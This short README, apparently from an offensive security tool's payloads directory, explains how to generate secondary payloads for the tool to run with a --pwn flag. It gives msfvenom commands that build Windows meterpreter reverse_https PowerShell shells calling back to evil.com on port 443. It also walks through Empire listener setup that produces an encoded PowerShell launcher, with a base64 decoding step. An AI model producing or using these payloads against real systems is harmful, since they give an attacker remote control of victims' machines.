Use this directory for secondary payloads. Results of this execution will not be reported remotely.

Examples:
    # Windows 64 bit meterpreter
    msfvenom -p windows/x64/meterpreter/reverse_https -f psh -o meterpreter_reverse_https.ps1 LHOST=evil.com LPORT=443

    # Windows 32 bit meterpreter
    msfvenom -p windows/meterpreter/reverse_https -f psh -o meterpreter_reverse_https.ps1 LHOST=evil.com LPORT=443

    # Stageless 32 bit meterpreter
    msfvenom -p windows/meterpreter_reverse_https -f psh -o meterpreter_reverse_https.ps1 LHOST=evil.com LPORT=443


    # Empire
    listeners
    uselistener http

    set Name evil.com-pwnage
    set Host http://evil.com
    set Launcher ""
    set Port 80

    execute
    # listener should start automatically
    launcher powershell
    [if the output of this command is base64 encoded use: echo "{base64 string}" | base64 -d > shell_empire.ps1
    Alternatively use base64decode.org or some other online tool to decode the launcher

    Place the launcher(s) into the payloads directory and run the code with the --pwn flag
    Make sure the launchers exit correctly if multiple are used
